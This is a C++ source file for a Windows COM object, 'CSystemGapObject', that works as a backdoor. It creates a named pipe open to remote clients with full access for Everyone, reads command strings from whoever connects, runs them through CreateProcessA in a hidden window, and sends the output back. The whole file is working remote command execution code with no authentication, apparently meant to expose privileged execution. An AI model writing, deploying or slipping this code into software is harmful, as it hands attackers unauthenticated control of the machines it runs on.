// SystemGapObject.cpp: CSystemGapObject 的实现

#include "pch.h"
#include "SystemGapObject.h"


// CSystemGapObject

STDMETHODIMP_(HRESULT __stdcall) CSystemGapObject::Create()
{
	
	HANDLE hGap = CreateSystemGap("\\\\.\\pipe\\SystemGap");
	if (hGap != INVALID_HANDLE_VALUE)
	{
		HandleGapMsg(hGap);
	}

    return S_OK;
}


void CSystemGapObject::HandleGapMsg(HANDLE hGap) {
	while (TRUE) {
		Sleep(1000);
		printf("[+]Waiting for Client....\n");
		if (ConnectNamedPipe(hGap, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED)) {
			//// 客户端连接成功....
			char szBuffer[BUFF_SIZE];
			memset(szBuffer, 0, BUFF_SIZE);
			DWORD dwLen;
			ReadFile(hGap, szBuffer, BUFF_SIZE, &dwLen, NULL);
			printf("[+]Receive %d bytes.\n", dwLen);
			if (!ExecCommand(hGap, szBuffer)) {
				printf("[+]Execute Error %d \n", GetLastError());
			}

			DisconnectNamedPipe(hGap);
		}

	}
	return;
}


HANDLE CSystemGapObject::CreateSystemGap(
	char* gap_name
)
{
	DWORD dwRes = 0;
	if (NULL == gap_name) {
		return NULL;
	}
	SECURITY_ATTRIBUTES sa;
	if (GenerateEveryoneSecAttr(&sa) == FALSE)
	{
		printf("[-]Generate PSECURITY_ATTRIBUTES Error %u\n", GetLastError());
		return NULL;
	}
	HANDLE hPipe = CreateNamedPipeA(
		gap_name,
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
		PIPE_UNLIMITED_INSTANCES,
		BUFF_SIZE,
		BUFF_SIZE,
		0,
		&sa);

	if (hPipe == INVALID_HANDLE_VALUE) {
		dwRes = GetLastError();
		printf("[-]Create Pipe Error %d \n", dwRes);
		return NULL;
	}

	// dwRes = SetNamedSecurityInfoA(gap_name, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL);

	if (ERROR_SUCCESS != dwRes) {
		printf("[-]SetNamedSecurityInfo Error %u\n", dwRes);
		return NULL;
	}

	printf("[+]Create Gap Sucess...\n");
	return hPipe;
}



BOOL CSystemGapObject::GenerateEveryoneSecAttr(PSECURITY_ATTRIBUTES sa) {
	PSID pEveryoneSID = NULL;
	PACL pACL = NULL;
	PSECURITY_DESCRIPTOR pSD = NULL;
	EXPLICIT_ACCESS ea[1];
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
	SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;
	DWORD dwRes = 0;
	// Create a well-known SID for the Everyone group.
	if (!AllocateAndInitializeSid(&SIDAuthWorld, 1,
		SECURITY_WORLD_RID,
		0, 0, 0, 0, 0, 0, 0,
		&pEveryoneSID))
	{
		printf("[-]AllocateAndInitializeSid Error %u\n", GetLastError());
		return FALSE;
	}

	ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	ea[0].grfAccessPermissions = GENERIC_ALL;
	ea[0].grfAccessMode = SET_ACCESS;
	ea[0].grfInheritance = NO_INHERITANCE;
	ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[0].Trustee.ptstrName = (LPTSTR)pEveryoneSID;
	dwRes = SetEntriesInAcl(1, ea, NULL, &pACL);
	if (ERROR_SUCCESS != dwRes)
	{
		printf("[-]SetEntriesInAcl Error %u\n", GetLastError());
		return FALSE;
	}
	pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
	if (!InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION))
	{
		printf("[-]InitializeSecurityDescriptor Error %u\n", GetLastError());
		return FALSE;
	}
	if (!SetSecurityDescriptorDacl(pSD,
		TRUE,     // bDaclPresent flag   
		pACL,
		FALSE))   // not a default DACL 
	{
		printf("[-]SetSecurityDescriptorDacl Error %u\n", GetLastError());
		return FALSE;
	}

	// Initialize a security attributes structure.
	sa->nLength = sizeof(SECURITY_ATTRIBUTES);
	sa->lpSecurityDescriptor = pSD;
	sa->bInheritHandle = FALSE;
	return TRUE;
}
VOID CSystemGapObject::TransmissionData(HANDLE hRead, HANDLE hGap) {
	char buff[100] = { 0 };
	memset(buff, 0, 100);
	DWORD dwRead = 0, dwLen;
	while (ReadFile(hRead, buff, 100, &dwRead, NULL) != 0)
	{
		WriteFile(hGap, buff, dwRead, &dwLen, NULL);
		memset(buff, 0, 100);
	}
	CloseHandle(hRead);
}



BOOL CSystemGapObject::ExecCommand(HANDLE hGap, char* szBuffer) {
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	HANDLE hRead, hWrite;
	if (!CreatePipe(&hRead, &hWrite, &sa, 0))
	{
		return FALSE;
	}
	STARTUPINFOA si = { sizeof(STARTUPINFOA) };
	GetStartupInfoA(&si);
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	si.hStdError = hWrite;
	si.hStdOutput = hWrite;
	PROCESS_INFORMATION pi;
	if (!CreateProcessA(NULL, szBuffer, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
	{
		return FALSE;
	}
	CloseHandle(hWrite);
	TransmissionData(hRead, hGap);
	return TRUE;
}